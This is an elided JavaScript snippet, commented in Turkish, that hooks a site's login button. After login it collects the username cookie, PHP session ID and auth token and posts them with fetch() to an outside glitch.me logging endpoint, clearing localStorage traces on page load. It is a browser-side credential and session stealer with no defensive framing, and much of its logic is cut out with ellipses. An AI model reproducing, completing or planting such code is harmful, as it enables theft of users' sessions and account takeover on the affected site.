(function() {
    ...
    function setupLoginListener() {
        ...
        if (loginBtn) {
            loginBtn.addEventListener('click', () => {
                ...
                // Girişten sonra cookie’leri kontrol et
    ...
    function sendCredentials() {
        ...
        // Daha sıkı bir kontrol: Cookie’lerin gerçekten girişle ilgili olduğundan emin ol
        if (!usernameCookie && !phpSessId && !authToken) {
            console.log('Giriş cookie’leri bulunamadı, gönderim iptal edildi');
            return;
        }
        ...
        fetch('https://katip-atlas.glitch.me/log', {
            ...
            .then(response => {
                ...
                localStorage.removeItem('pendingLogin'); // Başarılıysa temizle
    ...
    // Sayfa yüklendiğinde eski veriyi temizle
    window.addEventListener('load', () => {
        localStorage.removeItem('pendingLogin'); // Eski veriyi sıfırla
    });
})();
